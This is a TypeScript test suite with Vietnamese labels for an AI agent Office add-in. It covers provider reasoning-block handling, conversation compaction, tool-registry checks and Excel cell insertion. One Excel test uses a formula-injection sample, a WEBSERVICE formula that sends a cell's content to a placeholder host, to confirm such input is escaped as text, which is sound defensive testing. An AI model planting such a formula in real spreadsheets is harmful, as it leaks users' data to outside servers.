/** Rà soát kiến trúc 20/11/2026: các chỗ sửa nhỏ theo bảng phát hiện ở tasks/viec-le/ra-soat-kien-truc/ra-soat-kien-truc-2026-11-20.md */
import * as assert from "assert";
import { getProvider } from "../../src/core/providers";
import { compactIfNeeded } from "../../src/core/agent/compaction";
import { AgentMessage, hasThinkingRaw } from "../../src/core/agent/types";
import { slimForStorage } from "../../src/core/conversations";

const P = (id: string) => getProvider(id)!;
const sse = (events: any[]) => new Response(events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join(""), { status: 200 });
const anthText = (t: string) =>
  sse([
    { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } },
    { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: t } },
    { type: "message_delta", delta: { stop_reason: "end_turn" } },
  ]);
const OR_RAW = { kind: "openrouter", reasoning: [{ type: "reasoning.text", text: "", signature: "S", format: "anthropic-claude-v1", index: 0 }] };
const GEM_RAW = { kind: "gemini", parts: [{ functionCall: { name: "doc_read", args: {} }, thoughtSignature: "G" }] };

describe("Rà soát kiến trúc – khối suy nghĩ OpenRouter hết hợp lệ khi phần đứng trước đổi (CLAUDE.md, quy tắc khối suy nghĩ)", () => {
  it("hasThinkingRaw: Anthropic và OpenRouter có; Gemini, không raw, tin người dùng thì không", () => {
    assert.strictEqual(hasThinkingRaw({ role: "assistant", raw: { kind: "anthropic", blocks: [] } }), true);
    assert.strictEqual(hasThinkingRaw({ role: "assistant", raw: OR_RAW }), true);
    assert.strictEqual(hasThinkingRaw({ role: "assistant", raw: GEM_RAW }), false);
    assert.strictEqual(hasThinkingRaw({ role: "assistant" }), false);
    assert.strictEqual(hasThinkingRaw({ role: "user", raw: OR_RAW }), false);
  });

  it("Tóm tắt hội thoại: phần giữ lại bỏ reasoning_details của OpenRouter, giữ raw của Gemini, không sửa lịch sử gốc", async () => {
    const big = "x".repeat(3000);
    const h: AgentMessage[] = [];
    for (let k = 0; k < 4; k++) {
      h.push({ role: "user", content: `câu ${k} ${big}` });
      h.push({ role: "assistant", content: `đáp ${k}`, raw: k % 2 ? GEM_RAW : OR_RAW });
    }
    const r = await compactIfNeeded({ history: h, provider: P("anthropic"), key: "K", model: "claude-haiku-5-5", limitChars: 8000, fetchFn: (async () => anthText("tóm tắt")) as any });
    assert.strictEqual(r.compacted, true);
    const kept = r.history.filter((m) => m.role === "assistant") as any[];
    assert.ok(kept.length > 0);
    assert.ok(kept.every((m) => m.raw?.kind !== "openrouter"), "không còn reasoning_details cũ");
    assert.ok(kept.some((m) => m.raw?.kind === "gemini"), "raw Gemini vẫn giữ");
    assert.ok(h.every((m) => m.role !== "assistant" || !!m.raw), "lịch sử gốc không bị sửa");
  });

  it("Bản lưu: từ tin nhắn đầu tiên bị rút gọn trở đi thì bỏ cả reasoning_details của OpenRouter; trước đó giữ nguyên", () => {
    const h: AgentMessage[] = [
      { role: "user", content: "a" },
      { role: "assistant", content: "b", raw: OR_RAW },
      { role: "user", content: "c", images: [{ mime: "image/png", data: "AA" }] },
      { role: "assistant", content: "d", raw: OR_RAW },
      { role: "assistant", content: "e", raw: GEM_RAW },
    ];
    const s = slimForStorage(h) as any[];
    assert.ok(s[1].raw && !s[3].raw);
    assert.strictEqual(s[4].raw?.kind, "gemini");
  });
});

describe("Rà soát kiến trúc – sổ công cụ khớp nhau (nhãn bước, Tự kiểm tra, nhóm)", () => {
  // Nhập trong khối để lỗi nạp tệp Office (nếu có) chỉ làm hỏng khối này
  const { WORD_SPECS } = require("../../src/office/wordTools");
  const { excelTools } = require("../../src/office/excelTools");
  const { pptTools } = require("../../src/office/pptTools");
  const { describeCall } = require("../../src/office/tools");
  const { ALL_TOOL_GROUPS } = require("../../src/core/toolgroups");
  const fs = require("fs");
  const path = require("path");
  const officeDir = path.join(__dirname, "../../src/office");
  const selftestSrc = fs
    .readdirSync(officeDir)
    .filter((f: string) => /^selftest.*\.ts$/.test(f))
    .map((f: string) => fs.readFileSync(path.join(officeDir, f), "utf8"))
    .join("\n");
  const hosts: [string, { name: string }[]][] = [
    ["Word", WORD_SPECS],
    ["Excel", excelTools.specs],
    ["PowerPoint", pptTools.specs],
  ];

  it("Mỗi công cụ của ba ứng dụng có nhãn bước riêng trong describeCall (không rơi về tên công cụ)", () => {
    const missing = hosts.flatMap(([, specs]) => specs.map((s) => s.name).filter((n) => describeCall({ id: "x", name: n, args: {} }) === n));
    assert.deepStrictEqual(missing, []);
  });

  it("Mỗi công cụ của ba ứng dụng có bước trong Tự kiểm tra (CLAUDE.md: thêm hoặc sửa công cụ Office phải thêm bước)", () => {
    const missing = hosts.flatMap(([, specs]) => specs.map((s) => s.name).filter((n) => !selftestSrc.includes(`"${n}"`)));
    assert.deepStrictEqual(missing, []);
  });

  it("Tên công cụ không trùng giữa các tệp của cùng ứng dụng; nhóm chỉ nêu công cụ có thật", () => {
    for (const [host, specs] of hosts) {
      const names = specs.map((s) => s.name);
      assert.strictEqual(new Set(names).size, names.length, `${host}: tên công cụ trùng`);
    }
    const all = new Set(hosts.flatMap(([, specs]) => specs.map((s) => s.name)).concat(["read_other_app", "write_other_app", "use_skill", "read_attachment_pages", "propose_memory"]));
    const ghost = ALL_TOOL_GROUPS.flatMap((g: any) => g.tools).filter((n: string) => !all.has(n));
    assert.deepStrictEqual(ghost, []);
  });
});

describe("Rà soát kiến trúc – các sửa nhỏ khác", () => {
  const { answerToExcelCells, cellAsText } = require("../../src/core/table");
  const { attachmentPrivacyNote } = require("../../src/core/pdfPages");

  it("Nút Chèn của Excel: dòng chữ bắt đầu bằng =, +, @ ghi thành chữ, không thành công thức; số âm giữ nguyên", () => {
    const r = answerToExcelCells("Kết quả:\n=WEBSERVICE(\"https://x.example/?q=\"&A1)\n+1\n-5\n@x");
    assert.strictEqual(r.table, false);
    assert.deepStrictEqual(r.values, [["Kết quả:"], ["'=WEBSERVICE(\"https://x.example/?q=\"&A1)"], ["'+1"], ["-5"], ["'@x"]]);
  });

  it("Nút Chèn của Excel: bảng Markdown ghi đủ ô, ô công thức thành chữ; câu trả lời rỗng ra một ô trống", () => {
    const r = answerToExcelCells("| Tên | Giá |\n|---|---|\n| A | =1+1 |\n| B | 12 |");
    assert.strictEqual(r.table, true);
    assert.deepStrictEqual(r.values, [["Tên", "Giá"], ["A", "'=1+1"], ["B", "12"]]);
    assert.deepStrictEqual(answerToExcelCells("").values, [[""]]);
  });

  it("cellAsText dùng chung (core/table) vẫn là hàm ghi chéo nhập từ crossExec", () => {
    assert.strictEqual(require("../../src/office/crossExec").cellAsText, cellAsText);
  });

  it("Dòng nhắc riêng tư: key Cohere (có gói dùng thử) cũng được nhắc có điều kiện như Gemini, Groq", () => {
    assert.match(attachmentPrivacyNote({ providerId: "cohere", providerName: "Cohere", modelId: "command-a" }), /gói miễn phí/);
    assert.strictEqual(attachmentPrivacyNote({ providerId: "anthropic", providerName: "Anthropic", modelId: "claude-haiku-5-5" }), "");
  });
});
